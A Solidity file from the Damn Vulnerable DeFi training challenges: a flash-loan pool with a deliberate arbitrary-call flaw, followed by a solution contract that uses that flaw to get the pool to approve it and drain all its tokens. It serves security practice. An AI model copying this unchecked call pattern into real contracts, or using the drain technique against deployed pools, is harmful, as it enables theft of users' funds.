// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}

// == SOLUTION ==

contract AttackerContract {
    // TrusterLenderPool public pool;
    // DamnValuableToken public token;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recoveryAddr) {
        // pool = _pool;
        // token = _token;

        // Give approval to this attacker contract of all the pool's tokens
        bytes memory data =
            abi.encodeWithSignature("approve(address,uint256)", address(this), _token.balanceOf(address(_pool)));
        _pool.flashLoan(0, address(this), address(_token), data);
        _token.transferFrom(address(_pool), _recoveryAddr, _token.balanceOf(address(_pool)));
    }
}
